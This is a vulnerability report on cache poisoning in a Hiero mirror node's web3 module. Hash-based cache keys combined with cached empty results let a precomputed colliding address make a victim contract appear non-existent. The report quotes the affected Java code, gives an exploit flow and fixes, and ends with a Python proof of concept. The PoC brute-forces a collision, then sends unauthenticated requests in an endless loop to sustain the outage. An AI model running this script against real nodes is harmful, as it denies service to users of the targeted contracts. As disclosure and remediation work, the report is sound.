### Title
Cache Poisoning via Hash Collision in `CACHE_NAME_EVM_ADDRESS` / `CACHE_NAME_ALIAS` Using `Arrays.hashCode` as Cache Key

### Summary
Both `findByEvmAddressAndDeletedIsFalse` and `findByEvmAddressOrAliasAndDeletedIsFalse` in `EntityRepository` use `@spelHelper.hashCode(#alias)` — which resolves to `Arrays.hashCode(byte[])`, a 32-bit integer — as the sole cache key. Because `Optional.empty()` (entity not found) is also cached (`unless = "#result == null"` does not exclude it), an unauthenticated attacker who precomputes a 20-byte address `B` with the same 32-bit hash as a legitimate entity address `A` can poison the `CACHE_NAME_EVM_ADDRESS` or `CACHE_NAME_ALIAS` cache, causing all subsequent lookups for `A` to return `Optional.empty()` until the 1-second TTL expires.

### Finding Description

**Exact code locations:**

`web3/src/main/java/org/hiero/mirror/web3/evm/config/EvmConfiguration.java`, lines 99–105:
```java
@Bean(CACHE_MANAGER_ENTITY)
CacheManager cacheManagerEntity() {
    final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
    caffeineCacheManager.setCacheNames(Set.of(CACHE_NAME, CACHE_NAME_EVM_ADDRESS, CACHE_NAME_ALIAS));
    caffeineCacheManager.setCacheSpecification(cacheProperties.getEntity());
    return caffeineCacheManager;
}
```

`web3/src/main/java/org/hiero/mirror/web3/repository/EntityRepository.java`, lines 32–49:
```java
@Cacheable(
    cacheNames = CACHE_NAME_EVM_ADDRESS,
    cacheManager = CACHE_MANAGER_ENTITY,
    key = "@spelHelper.hashCode(#alias)",
    unless = "#result == null")
Optional<Entity> findByEvmAddressAndDeletedIsFalse(byte[] alias);

@Cacheable(
    cacheNames = CACHE_NAME_ALIAS,
    cacheManager = CACHE_MANAGER_ENTITY,
    key = "@spelHelper.hashCode(#alias)",
    unless = "#result == null")
Optional<Entity> findByEvmAddressOrAliasAndDeletedIsFalse(byte[] alias);
```

`common/src/main/java/org/hiero/mirror/common/util/SpelHelper.java`, lines 20–22:
```java
public int hashCode(byte[] value) {
    return Arrays.hashCode(value);
}
```

**Root cause:** `Arrays.hashCode(byte[])` produces a 32-bit polynomial hash. The cache key space is only 2^32 (~4 billion). Two distinct 20-byte EVM addresses can produce the same integer key. Spring's `@Cacheable` uses this integer as the sole lookup key — there is no secondary equality check on the actual byte array content. Additionally, `unless = "#result == null"` does not exclude `Optional.empty()` (a non-null object), so "not found" results are cached and can overwrite or preempt legitimate entries.

**Exploit flow:**
1. Attacker identifies target entity address `A` (e.g., a widely-used contract's EVM address).
2. Attacker precomputes offline a 20-byte address `B` (valid hex, passes `@Hex` validation) such that `Arrays.hashCode(B) == Arrays.hashCode(A)`. With a 32-bit hash space, this requires ~2^32 operations on average — feasible in seconds on modern hardware.
3. Attacker sends repeated unauthenticated POST requests to `/api/v1/contracts/call` with `"from": "<hex(B)>"` or `"to": "<hex(B)>"`.
4. During EVM execution, `CommonEntityAccessor.get(Address, timestamp)` calls `findByEvmAddressAndDeletedIsFalse(B)`. Since `B` does not exist in the DB, the result is `Optional.empty()`.
5. `Optional.empty() != null`, so `unless = "#result == null"` does not suppress caching. The entry `hashCode(B) → Optional.empty()` is written into `CACHE_NAME_EVM_ADDRESS`.
6. Any subsequent lookup for address `A` hits the cache at key `hashCode(A) = hashCode(B)` and returns `Optional.empty()` — entity `A` appears non-existent.
7. The entity cache TTL is `expireAfterWrite=1s`. The attacker repeats the request every second to sustain the poisoning indefinitely.

### Impact Explanation
Entity resolution for EVM addresses and aliases is the foundation of all contract call processing in the web3 module. Poisoning the cache for a target address causes `CommonEntityAccessor` to return `Optional.empty()`, which propagates as a "contract not found" or "account not found" error through the EVM execution path. This effectively denies service for any contract call targeting the victim address for as long as the attack is sustained. The attack is surgical: the attacker can target a specific high-value contract (e.g., a DEX, bridge, or HTS precompile proxy) without affecting other addresses. The database is not modified; only the in-process cache is corrupted.

### Likelihood Explanation
The `/api/v1/contracts/call` endpoint requires no authentication. The `from` field accepts any valid 40-hex-character address. Hash collision precomputation for `Arrays.hashCode` over 20 bytes is feasible offline in seconds. Sustaining the attack requires only ~1 HTTP request per second per target address. No special privileges, tokens, or on-chain state are required. The attack is fully repeatable and automatable.

### Recommendation
1. **Replace the cache key with the full byte array content**, not its hash. Use `Arrays.toString(#alias)` or `T(java.util.Base64).getEncoder().encodeToString(#alias)` as the SpEL key expression. This makes the key collision-resistant.
2. **Do not cache negative results** (`Optional.empty()`). Change `unless = "#result == null"` to `unless = "#result == null || !#result.isPresent()"` (or `unless = "#result?.isEmpty() ?: true"`). This prevents "not found" responses from poisoning the cache for legitimate addresses.
3. Consider using `java.util.Arrays.equals` semantics at the cache layer, or switch to a `Map<ByteArrayWrapper, ...>` pattern where `ByteArrayWrapper` implements `equals`/`hashCode` correctly.

### Proof of Concept
```python
import struct, itertools, requests

TARGET_ADDR_HEX = "d9d0c5c0ff85758bdf05a7636f8036d4d065f5b6"  # victim contract

def arrays_hash_code(b: bytes) -> int:
    result = 1
    for byte in b:
        signed = byte if byte < 128 else byte - 256
        result = (31 * result + signed) & 0xFFFFFFFF
    # convert to signed int32
    if result >= 0x80000000:
        result -= 0x100000000
    return result

target_bytes = bytes.fromhex(TARGET_ADDR_HEX)
target_hash = arrays_hash_code(target_bytes)

# Brute-force a collision (offline, ~2^32 ops)
for i in range(0x100000000):
    candidate = struct.pack(">Q", i).ljust(20, b'\x00')[:20]
    if arrays_hash_code(candidate) == target_hash and candidate != target_bytes:
        collision_hex = candidate.hex()
        print(f"Collision found: {collision_hex}")
        break

# Sustain the attack
import time
while True:
    requests.post("http://mirror-node/api/v1/contracts/call", json={
        "from": collision_hex,
        "to": "0000000000000000000000000000000000000001",
        "gas": 21000
    })
    time.sleep(0.9)
```
Legitimate calls to `TARGET_ADDR_HEX` will return entity-not-found errors for the duration of the attack.